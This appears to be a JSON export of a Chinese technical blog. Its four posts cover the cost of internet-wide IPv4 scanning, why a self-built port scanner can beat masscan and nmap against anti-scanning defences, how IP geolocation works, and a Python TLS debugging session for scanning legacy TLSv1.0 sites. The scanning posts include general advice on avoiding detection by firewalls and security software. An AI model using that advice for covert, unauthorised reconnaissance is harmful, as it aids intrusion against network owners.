{"meta":{"title":"Lyle's Blog","subtitle":null,"description":null,"author":"Lyle","url":"https://blog.lyle.ac.cn","root":"/"},"pages":[],"posts":[{"title":"全网测绘的成本探究","slug":"scan-cost","date":"2023-06-17T05:44:44.000Z","updated":"2023-06-17T05:58:53.008Z","comments":true,"path":"2023/06/17/scan-cost/","link":"","permalink":"https://blog.lyle.ac.cn/2023/06/17/scan-cost/","excerpt":"有时候会好奇一个问题，如果不考虑人员、合规等成本，想测绘一次全网的成本是什么样的？尝试做了一些理论计算，形成这篇文章，供各位感兴趣的同学参考。","text":"有时候会好奇一个问题，如果不考虑人员、合规等成本，想测绘一次全网的成本是什么样的？尝试做了一些理论计算，形成这篇文章，供各位感兴趣的同学参考。 理论计算IP地址数量在开始探讨全网测绘的成本之前，让我们先进行一些简单的理论计算。IPv4地址由32位二进制数字组成，因此在理论上有2^32个不同的地址，换算成十进制，这个数字是4,294,967,296。然而，在现实世界中，并非所有的IP地址都可用于公网，因为有一些特殊的保留地址范围存在。 首先，我们有私有地址空间，包括以下范围： 10.0.0.0&#x2F;8 172.16.0.0&#x2F;12 192.168.0.0&#x2F;16 然后，还有一些其他的保留地址范围，包括： 0.0.0.0&#x2F;8：当前网络（仅限于源地址） 127.0.0.0&#x2F;8：本地回环地址 169.254.0.0&#x2F;16：链路本地地址（用于自动配置） 192.0.0.0&#x2F;24：IETF 协议相关 （RFC 5736） 192.0.2.0&#x2F;24：TEST-NET-1，用于文档和示例 192.88.99.0&#x2F;24：6to4 Relay Anycast 198.18.0.0&#x2F;15：用于网络性能测试和测量 （RFC 2544） 198.51.100.0&#x2F;24：TEST-NET-2，用于文档和示例 203.0.113.0&#x2F;24：TEST-NET-3，用于文档和示例 224.0.0.0&#x2F;4：多播地址 240.0.0.0&#x2F;4：保留地址，未来使用 为了计算可用的公网IPv4地址，我们需要从总数中减去这些保留地址。以下是每个保留范围的地址数量： 私有地址空间： 10.0.0.0&#x2F;8：2^24 &#x3D; 16,777,216 172.16.0.0&#x2F;12：2^20 &#x3D; 1,048,576 192.168.0.0&#x2F;16：2^16 &#x3D; 65,536 保留地址： 0.0.0.0&#x2F;8：2^24 &#x3D; 16,777,216 127.0.0.0&#x2F;8：2^24 &#x3D; 16,777,216 169.254.0.0&#x2F;16：2^16 &#x3D; 65,536 192.0.0.0&#x2F;24：2^8 &#x3D; 256 192.0.2.0&#x2F;24：2^8 &#x3D; 256 198.18.0.0&#x2F;15：2^17 &#x3D; 131,072 192.88.99.0&#x2F;24：2^8 &#x3D; 256 198.51.100.0&#x2F;24：2^8 &#x3D; 256 203.0.113.0&#x2F;24：2^8 &#x3D; 256 224.0.0.0&#x2F;4：2^28 &#x3D; 268,435,456 240.0.0.0&#x2F;4：2^28 &#x3D; 268,435,456 255.255.255.255&#x2F;32：1 将这些数字相加，我们得到：16777216 + 1048576 + 65536 + 16777216 + 16777216 + 65536 + 256 + 256 + 131072 + 256 + 256 + 256 + 268435456 + 268435456 + 1 &#x3D; 588514561 现在，我们可以从总数中减去保留地址的数量：4294967296 - 588514561 &#x3D; 3706452735。 值得注意的是，在现实世界中，并非所有的地址都已经分配和使用，因此实际的可用公网IPv4地址数量略小于37亿，这个结果仅提供了一个用于大致估计的上限值。如果需要实时的、完整的已分配的IP列表，可以通过相关的组织获取。 测绘时间成本基于IP地址的数量，让我们按SYN扫描来计算一下发送报文所需的时间。 首先，一个TCP SYN报文的大小为54字节（包括14字节的MAC层、20字节的IP报文和20字节的TCP报文）。1 Gbps的传输速率等于每秒传输125,000,000字节，将这个速率除以每个报文的大小54字节，得到大约2314815个报文每秒。 接下来，我们将使用之前计算得到的可用公网IPv4地址数量（3706452735个）除以每秒发送的报文数量（2314815个），得到约1601秒。 根据2013年ZMap论文的数据，大约有3450万个开放的443端口，大约占IPv4地址空间的百分之一。 考虑到TLS握手的长度，最长的情况下使用RSA算法进行完整的证书链验证和客户端身份验证，总长度可能超过数万字节。最短的情况下使用ECDHE密钥交换算法，并且不进行证书链验证和客户端身份验证，总长度大约在几百字节。 为了折中考虑，我们以5000字节为一个TLS握手的长度来计算。也就是说，约有百分之一的扫描需要占用百倍的带宽。因此，在之前计算的总时长上乘以2，得到3200秒，即54分钟。 这个计算给我们提供了一个大致的时间估计，说明在当前条件下进行全网测绘可能需要约54分钟的时间。 在Zmap论文中有提到： 1We introduce ZMap, a modular, open-source network scanner specifically architected to perform Internet-wide scans and capable of surveying the entire IPv4 address space in under 45 minutes from user space on a single machine, approaching the theoretical maximum speed of gigabit Ethernet. Zmaps使用Gb级别的网卡在45分钟扫描完互联网空间的 443 端口，与我们之前的计算结果非常接近，说明我们的计算是有参考意义的。 不妨采用乐观估计，假设互联网是稀疏的，大多数IP只开放一个到数十个端口，且只使用SYN扫描。在这种情况下，我们不需要考虑回包的时间。按照这个假设，要扫描完整个互联网所需的时间可以按以下公式计算： 3706452735（可用的公网IPv4地址数量） × 65536（每个地址可扫描的端口数） ÷ 2314815（每秒发送的报文数量） ÷ 60（转换为分钟） ÷ 60（转换为小时） ÷ 24（转换为天数） ≈ 1215天 也就是说，即使使用了Gb级别的网卡，乐观估计下完成整个互联网的扫描也需要超过一千两百天的时间。 测绘经济成本不难想到的是，除了时间成本，大流量还需要经济资源。根据当前腾讯云的无折扣价格计算，一个配置为1核1G内存、200Mbps带宽的云主机每月需要17747元。为了达到Gbps级别的网速，需要使用50台这样的云主机。 注：当带宽利用率高于10%时，按带宽计费成本低于按流量计费。 根据计算公式：(1215 &#x2F; 30) * 17747 * 50 &#x3D; 35937675 因此，根据理论计算，完成一次完整的互联网IPv4地址空间的扫描成本约为三千万左右。 需要注意的是，这个测算模型主要考虑了发送流量所需的时间。如果我们希望缩短测绘的时间，只需要按比例增加使用的机器数量即可。 上述的时间和经济的估计给我们提供了一个实际情况下的时间框架和资金量级的参考，以更好地理解全网测绘的成本和挑战。 工程实践当然，仅通过纸面计算成本是不现实的，因为工程实践中需要进行更多的权衡和实际操作。在面对不可接受的成本时，我们可以考虑一些方法来控制成本。 首先，我们并不一定需要对所有地址进行测绘，可以将范围缩小到某个国家或地区，这样数量级会大大减小。 同时，我们可以借鉴单机测绘工具如nmap的做法，在进行全端口测绘之前进行活跃探测。这样可以避免对不活跃的IP进行全端口测绘，从而在很大程度上节省成本。 此外，如果全端口测绘并非刚需，可以参考IANA的端口注册表 和工程实践的经验，实际常用端口的数量相对较少。除非有特定需求，否则在测绘过程中仅关注常见端口的成本会大大降低。 让我们重新计算一下，假设将测绘范围缩小到国内IP的10%和活跃IP的10%，仅测绘600个端口。根据这个假设，成本将从千万级降低到万级。 在缩减成本的同时，我们也需要考虑结果的有效性，这涉及到以下几个问题： 简单的、基于单次 SYN 报文能否保证测绘准确？ 毫无疑问的，考虑到丢包率，单次单报文探测肯定存在漏报率。根据《Census and Survey of the Visible Internet》论文的数据，单个报文在互联网上传输的丢包率约为 2% 左右。因此，单次探测的准确率大约在 98% 左右。对于一些成本敏感、结果要求不高的情况而言，这个准确率已经足够。 如果想识别应用指纹，需要多少报文？ 单个 SYN 报文只能检测端口的开放情况。要完成对应用的交互和识别，需要进行完整的 TCP 握手以及后续的应用层交互。 当前的nmap服务探针超过100个，而要完成服务的交互，则需要完成完整的TCP握手以及后续的应用层交互，又是倍数级的消耗。 显然对于单个开放端口用数百个探针进行测绘，扩散到全网成本的基数，又是不可接受的。这就又需要对探针和效果进行取舍。 运行测绘系统是否有其它成本？ 还需要注意的是，运行测绘系统还涉及到其他成本，数据存储、数据索引、任务分发、日志收集等等都需要计算、存储、网络资源，随着测绘规模不断地加大，对应存储计算的资源也会相应提升。 写在最后本文通过粗略的纸面计算，对全网测绘的成本进行了估算，给出了测绘资源消耗的参考值。仅为工作之余闲暇之作，文中计算和推理都有非常多不严谨的部分，结论仅供参考。 参考资料文档与规范 RFC2544 Benchmarking Methodology for Network Interconnect Devices RFC3735 Special Use IPv4 Addresses RFC5736 IANA IPv4 Special Purpose Address Registry RFC6335 Internet Assigned Numbers Authority (IANA) Procedures for the Management of the Service Name and Transport Protocol Port Number Registry 腾讯云公网计费模式 IANA Service Name and Transport Protocol Port Number Registry 论文 Izhikevich L, Teixeira R, Durumeric Z. LZR: Identifying Unexpected Internet Services[C]&#x2F;&#x2F;USENIX Security Symposium. 2021: 3111-3128. Durumeric Z, Wustrow E, Halderman J A. ZMap: Fast Internet-wide Scanning and Its Security Applications[C]&#x2F;&#x2F;USENIX Security Symposium. 2013, 8: 47-53. Heidemann J, Pradkin Y, Govindan R, et al. Census and survey of the visible Internet[C]&#x2F;&#x2F;Proceedings of the 8th ACM SIGCOMM conference on Internet measurement. 2008: 169-182. 工具 腾讯云价格计算器 nmap zmap nmap 服务探针","categories":[],"tags":[]},{"title":"攻击面测绘：浅谈自研端扫的必要性","slug":"why-nmap-not-work","date":"2023-05-17T13:41:10.000Z","updated":"2023-05-17T14:01:04.713Z","comments":true,"path":"2023/05/17/why-nmap-not-work/","link":"","permalink":"https://blog.lyle.ac.cn/2023/05/17/why-nmap-not-work/","excerpt":"在进行端扫过程中，常常会使用masscan和nmap等工具，它们在发现和扫描目标系统的开放端口方面非常实用。 然而，随着反测绘技术的不断进步，这些工具的局限性也逐渐显现。接下来，我们将详细探讨这些工具面对反测绘时的缺点，并说明为什么需要自研端扫工具。","text":"在进行端扫过程中，常常会使用masscan和nmap等工具，它们在发现和扫描目标系统的开放端口方面非常实用。 然而，随着反测绘技术的不断进步，这些工具的局限性也逐渐显现。接下来，我们将详细探讨这些工具面对反测绘时的缺点，并说明为什么需要自研端扫工具。 Masscan在在攻击面测绘领域，速度被认为是至关重要的因素，因此masscan被广泛应用。但是，由于目标系统采取了各种反测绘措施（如限制扫描频率、封锁IP地址等），masscan的可用性在某些情况下会急剧下降。 masscan的两个明显特征是使用SYN扫描和在短时间内发送大量流量。然而，这两个特征很容易触发反测绘策略，从而影响masscan的效果。 首先，使用SYN扫描的特征非常明显，目标系统很容易检测到扫描活动。因此，防火墙和入侵检测系统很容易过滤或拦截masscan的扫描请求，从而限制了其扫描的准确性和全面性。 其次，masscan在短时间内发送大量流量，这也是其高效扫描的原因之一。然而，这种大量流量往往会被目标系统的防火墙或入侵检测系统察觉，可能被视为恶意攻击行为。结果就是大量漏报（未能探测到真实的开放端口）和误报（将防火墙返回的响应误认为端口开放），从而降低masscan的可靠性和可信度。 除了上述限制，masscan还存在功能上的缺陷。它主要用于进行端口扫描，但无法检测隐藏的服务和潜在漏洞。在进行攻击面测绘时，仅了解目标系统的开放端口是不够的，我们还需要深入了解这些服务的具体特征和可能存在的漏洞。 因此，尽管masscan在速度方面具有优势，但在应对反测绘措施方面可能效果不佳。在面对越来越复杂的网络环境和防御手段时，需要考虑使用其他工具或采取更细致的方法来克服这些挑战。 Nmap针对masscan的两个缺点，当需要进行大规模攻击面测绘并避免大量误报和防火墙报警时，nmap是一个可行的解决方案。 nmap是一款功能强大的开源工具，在攻击面测绘领域广泛应用。与masscan不同，nmap支持多种测绘方案，能够更全面地发现目标系统的开放端口，并通过深度扫描揭示隐藏的服务和漏洞。通过使用nmap，安全专业人员可以获得更准确和详细的信息，以评估系统的风险和安全性。 此外，nmap具有细粒度控制扫描速率的能力，可以调整扫描的速度和频率，以避免触发目标系统的防御机制。这种灵活性使得nmap成为处理大规模测绘任务的理想选择，能够降低误报和防火墙报警的风险。 然而，需要注意的是，nmap也存在一些问题。其中之一是在执行大规模扫描任务时可能出现长时间卡死的情况。这个问题在nmap项目的相关问题追踪中有多个案例，例如 https://github.com/nmap/nmap/issues/1385 和 https://github.com/nmap/nmap/issues/2106。 这些问题表明，在处理大规模扫描任务时，nmap可能会遇到性能方面的挑战，导致扫描过程变得非常缓慢或无响应。这对于需要快速获取结果的安全团队而言是一个明显的问题，尤其是在面对庞大的网络或复杂的系统架构时。 另一个问题是，作为一款常用的端口扫描软件，nmap很容易受到主流防护软件的研究和针对。由于nmap在网络安全领域的广泛应用，防护软件开发商通常会对其进行深入研究，以便及时发现并阻止nmap扫描活动。 防护软件可以通过检测nmap的特征、行为模式以及扫描过程中产生的网络流量等来辨识和阻断nmap扫描。一些常见的防护措施包括识别nmap的扫描脚本、检测扫描过程中频繁的连接和断开等异常行为，以及基于流量分析的技术来检测nmap的扫描特征。 第三个问题是效率问题。在设计nmap时，识别目标系统的具体操作系统、运行的服务等是一个重要的考虑因素。为了实现这一目标，nmap集成了大量的指纹库和匹配规则，用于识别目标系统的特征。然而，这也带来了一个问题，即在攻击面测绘过程中，部分指纹可能是不必要的，从而影响了扫描的效率。 这些不必要的指纹可能导致扫描时间的延长，因为nmap需要对目标系统的各种特征进行逐个匹配。在大规模扫描任务中，这将消耗大量的时间和资源，降低了测绘的效率。 总结综上所述，尽管masscan和nmap在攻击面测绘中都有其优势和局限性，但随着反测绘技术的发展，这些工具可能面临一些挑战。 为了克服这些挑战，满足特定需求并提高测绘的准确性、可靠性和效率，自研端扫工具可能是一个合适的选择。自研端扫工具可以根据实际情况设计和定制，更好地适应不同的网络环境和防御手段，并减少被防护软件检测的风险。","categories":[],"tags":[{"name":"测绘","slug":"测绘","permalink":"https://blog.lyle.ac.cn/tags/%E6%B5%8B%E7%BB%98/"}]},{"title":"浅谈IP-地理位置映射关系构建","slug":"ip-geolocation","date":"2023-02-12T01:53:59.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2023/02/12/ip-geolocation/","link":"","permalink":"https://blog.lyle.ac.cn/2023/02/12/ip-geolocation/","excerpt":"通过 IP 定位似乎并不是一个困难的问题，大量的三方平台如 Geolite、IPIP 等都提供了完善、更新及时的 IP 地理位置数据。但是如果没有这些数据，能否以常见的公开信息为基础，构建IP-地理位置信息映射呢？","text":"通过 IP 定位似乎并不是一个困难的问题，大量的三方平台如 Geolite、IPIP 等都提供了完善、更新及时的 IP 地理位置数据。但是如果没有这些数据，能否以常见的公开信息为基础，构建IP-地理位置信息映射呢？ IP分配分配机构让我们首先厘清IP的分配机制，实际IP分配是中心化分级进行的。负责分配IP地址的最上级机构是 ICANN (The Internet Corporation for Assigned Names and Numbers) (之前是由IANA负责)。 ICANN 首先把IP地址分给区域互联网注册管理机构 (Regional Internet Registries，RIR)，然后由RIR负责该地区的登记注册服务，下一级的机构则是大型组织，例如互联网服务提供商 (Internet service provider, ISP) 、大型企业技术公司、大学或政府机构运营，最后用户通过这些组织获取到了接入互联网的IP。 自治系统具体来说，RIR分配IP地址多是以自治系统为单位进行分配的，自治系统 (Autonomous System, AS) 是具有统一路由策略的巨型网络或网络群组，连接到互联网的每台设备都连接到一个具体的自治系统。 每个自治系统都分配有一个自治系统编号 (Autonomous System Number, ASN) ，ASN 是介于 1 和 65534 之间的唯一 16 位数字或介于 131072 和 4294967294 之间的 32 位数字。 RIR在分配AS时，并没有严格的标准，导致AS对应的注册单位信息会有差异性，有相对精确的例如： Luoyang, Henan Province, P.R.China. 26 Shyamoli, Bir Uttam A. W. Chowdhury Road Universiti Malaysia Terengganu 也会有分配大型ISP的情况，例如分配到 Chinanet 、AKAMAI-AS。 不难看出，在精确分配的前提下，可以粗略获取 IP 地理位置的信息。但是当IP分配到大型组织机构，例大型公司如微软、大型运营商如联通移动都拥有大量的机房与IP，这个时候很难通过这种方式获取到IP的具体信息。 具体的，可以通过 Whois 查看 IP 所属的AS单位。例如 whois 8.8.8.8 可以得到以下的结果 (完整输出较长，省略的部分用 ... 标出) ： 12345678910111213141516171819202122232425262728293031323334353637383940414243whois 8.8.8.8...# startNetRange: 8.0.0.0 - 8.127.255.255CIDR: 8.0.0.0/9NetName: LVLT-ORG-8-8NetHandle: NET-8-0-0-0-1Parent: NET8 (NET-8-0-0-0-0)NetType: Direct AllocationOriginAS:Organization: Level 3 Parent, LLC (LPL-141)RegDate: 1992-12-01Updated: 2018-04-23Ref: https://rdap.arin.net/registry/ip/8.0.0.0OrgName: Level 3 Parent, LLCOrgId: LPL-141Address: 100 CenturyLink DriveCity: MonroeStateProv: LAPostalCode: 71203Country: USRegDate: 2018-02-06Updated: 2023-01-03...OrgAbuseHandle: ABUSE5250-ARINOrgAbuseName: AbuseOrgAbusePhone: +1-650-253-0000OrgAbuseEmail: network-abuse@google.comOrgAbuseRef: https://rdap.arin.net/registry/entity/ABUSE5250-ARINOrgTechHandle: ZG39-ARINOrgTechName: Google LLCOrgTechPhone: +1-650-253-0000OrgTechEmail: arin-contact@google.comOrgTechRef: https://rdap.arin.net/registry/entity/ZG39-ARIN... 可以看出 8.8.8.8 是由 arin 分配给谷歌的IP。 小结不难看出，从 ICANN 到 RIR 再到具体服务商的链路是很清晰的。但是其中公开信息只有 AS 的分配，也就是说可以知道哪一个 IP 段分配给了哪一个机构，而无法简单的从公开信息获取IP地址到具体地理位置的映射。 定位方法地标定位上文提到了一些 AS 会分配到相对精确的单位的，例如某个街道或者某个大学。容易想到，可以基于这种信息来对IP定位，然后基于这个基点向外扩充以获得更多IP的信息。这种方式被称为基于地标的定位。 在互联网发展早期，云服务普及程度不高，自建服务器的情况更频繁。这就使得除了特定AS以外，也可以通过一些知名单位的IP与位置来获得相邻IP的定位。而在服务上云以后，云的机房位置同样可以作为相对准确的地标信息来使用。此外，随着带有GPS组件的物联网设备、个人设备越来越普及，可以使用的地标信息也越来越多。 不过总体来说，由于地标分布较为离散，覆盖面和准确率都有限，这种方式只能一定程度上提供IP-地理位置映射的信息。 基于约束定位基于地标信息定位的主要问题是地标分布过于离散，如果需要测试的IP离地标较远，则只能通过时延简单估测目标和地标之间的距离，可用性相对差，于是学界提出了新的方案，即基于约束定位 (Constraint-Based Geolocation, CBG) 。 基于约束定位的基本思想类似与多圆交汇定位法，首先获得目标IP与地标的时延，将时延乘以光纤的传输速度，即可以获得目标IP与地标的最远距离。那么和多个地标测出时延之后，每一组数据都以地标为圆心，最远距离为半径画圆，所有圆的公共交点即是目标的位置。 基于社交网络的定位在公开的研究中，也有基于社交网络的定位方法。其中比较出名的是基于 twitter 公开数据的一系列研究。这种方式在获取用户的社交关系后建立社交网络，并通过部分推文暴露的地址构建用户的地理位置分布信息。这些研究则主要使用了神经网络等方法来训练模型，最后实现地理位置推断的能力。 类似的，当拥有其他可以将推文、社交网络、IP数据关联时，可以使用这种方案来建立IP-地理位置的映射关系。 网络度量除了理论以外，在实际工程中，还有很多具体的问题需要解决。 ping直觉的，traceroute是一个合适度量两个IP间时延的方法。但实际上，很多营运商禁止了ICMP报文，在这种情况下，可以使用改造后的TCP&#x2F;UDP等报文进行度量。 校准上文提到了基于约束的定位方法，核心是将时延转化为距离的度量。但是实际这种方法受到网络之间拥塞程度、网络带宽、传输基建等多种因素影响，如果直接使用的话，精度会受到很大的限制。因此需要通过一些方案校准后才能正常使用。 杂谈持续更新最后，完成一次IP对应地理位置的测绘并不意味着一劳永逸。IP分配是一个变化的过程，不仅RIR会重新分配IP，例如将分配给运营商A的IP分配给运营商B；ISP也会重新分配自己所拥有的IP，例如客户A不再使用后，IP可能会分配给另一个客户，而两个客户的地理位置可能相差很远。因此如果要建立有时效性的数据库，需要及时对IP重分配的情况进行跟踪。 数据源本文提到的都是合法合规的获取IP地理位置的方案，这也是大部分服务商使用的方案。部分服务商在技术上会有一定的创新和更新，但整体原理是相差不大的。 而除此之外，是存在一些别的方案的。一些大厂商，例如Google会利用浏览器的优势来构建IP地址位置数据库。如这篇 帖子 中提到，当用户通过Chrome上网且开放了GPS权限时，Chrome会通过调用GPS获取用户出口IP的地理位置并记录下来。 还有一些黑灰产可能会使用泄露的LBS数据等用于定位。 特例最后，还有一些特殊情况需要考虑。例如当IP为大型组织用于CDN等用途时，常会使用anycast技术，此时单个ip实际对应多个位置。 参考链接参考论文 Gueye B, Ziviani A, Crovella M, et al. Constraint-based geolocation of internet hosts[C]&#x2F;&#x2F;Proceedings of the 4th ACM SIGCOMM conference on Internet measurement. 2004: 288-293. Wang Y, Burgener D, Flores M, et al. Towards Street-Level Client-Independent IP Geolocation[C]&#x2F;&#x2F;Nsdi. 2011, 11(2011): 27. Jurgens D, Finethy T, McCorriston J, et al. Geolocation prediction in twitter using social networks: A critical analysis and review of current practice[C]&#x2F;&#x2F;Proceedings of the International AAAI Conference on Web and Social Media. 2015, 9(1): 188-197. 参考专利 CN107181831B 一种逆向ip定位的方法 CN111064817B 一种基于节点排序的城市级ip定位方法 CN106254123B 一种面向城域网级别as域内网络拓扑的测绘方法 rfc RFC 1876 A Means for Expressing Location Information in the Domain Name System","categories":[],"tags":[]},{"title":"一次Python TLS适配出错的调试过程","slug":"python-ssl-debug","date":"2022-12-03T00:12:03.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2022/12/03/python-ssl-debug/","link":"","permalink":"https://blog.lyle.ac.cn/2022/12/03/python-ssl-debug/","excerpt":"事情起源于支持低版本TLS Web站点的扫描需求，开始觉得是比较简单的配置问题。而后随着调试发现涉及到Python的历史遗留问题、操作系统等多个坑点，于是做了记录以供保存。","text":"事情起源于支持低版本TLS Web站点的扫描需求，开始觉得是比较简单的配置问题。而后随着调试发现涉及到Python的历史遗留问题、操作系统等多个坑点，于是做了记录以供保存。 问题一最开始考虑直接使用 requests 的 HTTPAdapter 配置 ssl_context 的 minimum_version 直接解决问题，缩减后的样例代码如下： 12345678910111213import sslimport requestsclass HTTPAdapter(requests.adapters.HTTPAdapter): def init_poolmanager(self, *args, **kwargs): ssl_context = ssl.create_default_context() ssl_context.minimum_version = ssl.TLSVersion.TLSv1 kwargs[&quot;ssl_context&quot;] = ssl_context return super().init_poolmanager(*args, **kwargs)with requests.Session() as s: s.mount(&quot;https://&quot;, HTTPAdapter()) s.get(&quot;https://tls-v1-0.badssl.com:1010/&quot;) 比较意外的是报错了： urllib.error.URLError: &lt;urlopen error [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:1131)&gt; 。 考虑这种情况有两种可能：是 ssl 的问题，或者设置 ssl_context 没有生效。 于是直接通过ssl测试： 12345678910import sslimport socketdef get_ssl_data(host, port=443): context = ssl.create_default_context() sock = socket.socket(socket.AF_INET) conn = context.wrap_socket(sock, server_hostname=host) conn.connect((host, port)) print(conn.getpeercert())get_ssl_data(&quot;tls-v1-0.badssl.com&quot;, 1010) 仍然报错，这样看来是底层SSL库的原因。 确认了下当前环境： Ubuntu 20.04 / Python 3.8.10 / OpenSSL 1.1.1f 没有旧版本，应该不是环境的问题。考虑到有可能是较新的版本程序&#x2F;操作系统在逐步废弃较低的TLS版本。 抓包查看了 TLS 通信过程，发现报错信息是版本不支持，那应该是有其它的安全配置没有打开，于是通过搜索找到了一个方案 context.set_ciphers(&#39;ALL:@SECLEVEL=1&#39;) ： 123456789101112import sslimport socketdef get_ssl_data(host, port=443): context = ssl.create_default_context() context.minimum_version = ssl.TLSVersion.TLSv1 sock = socket.socket(socket.AF_INET) context.set_ciphers(&#x27;ALL:@SECLEVEL=1&#x27;) conn = context.wrap_socket(sock, server_hostname=host) conn.connect((host, port)) print(conn.getpeercert())get_ssl_data(&quot;tls-v1-0.badssl.com&quot;, 1010) 可以成功获取。 那么回过来考虑是否minimum_version设置不对。 在这篇Python的官方文档中提到： 3.6 版后已移除: OpenSSL 已经废弃了所有特定于版本的协议。请换用带有 SSLContext.minimum_version 和 SSLContext.maximum_version 的默认协议 PROTOCOL_TLS_SERVER 或 PROTOCOL_TLS_CLIENT 。 也就是说 minimum_version 是新版本的正确写法。 继续寻找原因，发现是 Ubuntu 在修复 bug 时patch了OpenSSL的行为，需要通过设置配置的方式显示打开才行。而上文使用的 set_ciphers(&#39;ALL:@SECLEVEL=1&#39;) 相当于显示设置了SECLEVEL。 所以只要通过 set_ciphers 设置安全等级即可，这里的配置也可以是 set_ciphers(&#39;DEFAULT:@SECLEVEL=1&#39;) 。 问题二项目的另一个需求是需要获取到对端站点的证书信息。由于 requests 的 HTTPResponse 对象不带证书、连接等信息， 原本获取证书的方法是通过层层 hook 加入证书信息。代码如下： 1234567891011121314151617181920212223242526272829303132import requestsHTTPResponse = requests.packages.urllib3.response.HTTPResponseorig_HTTPResponse__init__ = HTTPResponse.__init__def new_HTTPResponse__init__(self, *args, **kwargs): orig_HTTPResponse__init__(self, *args, **kwargs) try: self.peer_certificate = self.peer_certificate except AttributeError: passHTTPResponse.__init__ = new_HTTPResponse__init__HTTPAdapter = requests.adapters.HTTPAdapterorig_HTTPAdapter_build_response = HTTPAdapter.build_responsedef new_HTTPAdapter_build_response(self, request, resp): response = orig_HTTPAdapter_build_response(self, request, resp) try: response.peer_certificate = resp.peer_certificate except AttributeError: pass return responseHTTPAdapter.build_response = new_HTTPAdapter_build_responseHTTPSConnection = requests.packages.urllib3.connection.HTTPSConnectionorig_HTTPSConnection_connect = HTTPSConnection.connectdef new_HTTPSConnection_connect(self): orig_HTTPSConnection_connect(self) try: self.peer_certificate = self.sock.connection.get_peer_certificate() except AttributeError: passHTTPSConnection.connect = new_HTTPSConnection_connect 但是发现加入上文的 ssl_content 后无法获取到证书了，报错提示没有 get_peer_certificate 方法。 调试发现，默认情况下，requests 发起 https 请求进行 tls 通信使用的实例是 &lt;class &#39;urllib3.contrib.pyopenssl.WrappedSocket&#39;&gt; 。 这个类是 urllib3 基于 pyOpenSSL 的封装，get_peer_certificate 这个方法也是 pyOpenSSL 提供的。 而在显式设置 ssl_context 后，使用的 tls对象则是 &lt;class &#39;ssl.SSLSocket&#39;&gt; ，在ssl中并不存在 get_peer_certificate 这个方法。 这是由于 PyOpenSSL 库是在 Python 早期尚不支持 ssl 的时候加入的社区开源库，目的是提供对 OpenSSL 的 Python 封装。而原生的 ssl 库主要目的是支持 tls 通信，并不提供完整的 OpenSSL 封装。两个库之间互相不保证一致性，因此这里就无法获取对象了。 而这里可以使用原生库的 _connection.sock.getpeercert(True) 方法来获取证书。 问题三由于 urllib3.contrib.pyopenssl.WrappedSocket 是早期 urllib3 为了支持 tls 引入的，目前已经在计划弃用，所以在实现中放弃了原有的证书获取方案，转而使用原生的 ssl 。 但是在测试过程中，同样也在考虑如果要使用 PyOpenSSL 的 Context 是否可行，测试代码如下： 1234567import sslimport socketfrom urllib3.contrib.pyopenssl import PyOpenSSLContextcontext = PyOpenSSLContext(ssl.PROTOCOL_SSLv23)context.set_ciphers(&#x27;ALL:@SECLEVEL=1&#x27;)sock = socket.socket(socket.AF_INET)conn = context.wrap_socket(sock) 测试后发现并不能正常发起请求，报错显示 UNSUPPORTED_PROTOCOL 。 在命令行测试设置 cipher 可以正常连接。 1openssl s_client -connect tls-v1-0.badssl.com:1010 -cipher &#x27;ALL:@SECLEVEL=1&#x27; 考虑是否不同库的 set_ciphers 的行为不同。追踪了下调用，PyOpenSSL 的 set_ciphers 实际调用在 SSL.py 的 set_cipher_list 函数，通过 _lib.SSL_CTX_set_cipher_list(self._context, cipher_list) 调用 openssl 库。这里的 _lib 是通过 cryptography.hazmat.bindings 中的 _openssl.pyd 文件引入的。python 原生的 ssl 库则将 context 相关的调用都封装在 _ssl.pyd 中，同样是二进制调用 SSL_CTX_set_cipher_list 。 于是考虑是否原生 ssl 库和 PyOpenSSL 调用的版本不同。通过 strace -e openat python 跟踪调用库。 在测试环境下，原生库的ssl调用了 /usr/lib/python3.8/lib-dynload/_ssl.cpython-38-x86_64-linux-gnu.so ，该 so 之后调用 /lib/x86_64-linux-gnu/libssl.so.1.1 。而 PyOpenSSL 则直接调用了 /lib/x86_64-linux-gnu/libssl.so.1.1 ，两者 SSL 版本一致。 注意，在Windows环境下，Python 在安装时会安装对应的 libssl 到 Python\\DLLs 目录，而 PyOpenSSL 则使用 cryptography.hazmat.bindings.openssl.binding 对应的 OpenSSL 库，此时原生 ssl 和 PyOpenSSL 两者版本是不一致的。 既然版本是一致的，那么考虑是否调用存在问题。通过 gdb 调试，在 SSL_CTX_set_cipher_list 处下断点发现 ssl 库多了一次初始化的 SSL_CTX_set_cipher_list 调用，参数为 &quot;DEFAULT:!aNULL:!eNULL:!MD5:!3DES:!DES:!RC4:!IDEA:!SEED:!aDSS:!SRP:!PSK&quot; 。相关逻辑在这个 代码 中。此外，原生 ssl 库还有多处其它的初始化行为。 然而对应设置进行测试后，发现不是设置选项的原因。 继续查看代码发现 PyOpenSSLContext 初始化 通过 _openssl_versions (定义如下) 1234_openssl_versions = &#123; ssl.PROTOCOL_SSLv23: OpenSSL.SSL.SSLv23_METHOD, ssl.PROTOCOL_TLSv1: OpenSSL.SSL.TLSv1_METHOD,&#125; 传递给 OpenSSL.SSL.Context ，根据这个变量获取SSL上下文。 123method_func = self._methods[method]method_obj = method_func()context = _lib.SSL_CTX_new(method_obj) 而根据 openssl 手册 : These functions do not exist anymore, they have been renamed to TLS_method(), TLS_server_method() and TLS_client_method() respectively. 所以这里创建了一个错误的上下文，后面的设置也就没有意义了。 最后修改代码如下，可以成功连接： 12345678import sslimport socketfrom urllib3.contrib.pyopenssl import PyOpenSSLContextcontext = PyOpenSSLContext(ssl.PROTOCOL_TLSv1)context.set_ciphers(&quot;DEFAULT:@SECLEVEL=1&quot;)sock = socket.socket(socket.AF_INET)sock.connect((&quot;tls-v1-0.badssl.com&quot;, 1010))conn = context.wrap_socket(sock) 参考链接 urllib.request SSL Connection Python 3 Using ‘requests’ to access a website that only supports TLSv1.0 causing “unsupported protocol” error ssl.SSLError: unsupported protocol pyOpenSSL Add deprecation warnings for urllib3.contrib.pyopenssl Deprecate the pyOpenSSL TLS implementation and [secure] extra How to get response SSL certificate from requests in python _ssl.c SSL_CTX_set_cipher_list openssl-ciphers openssl pyOpenSSL 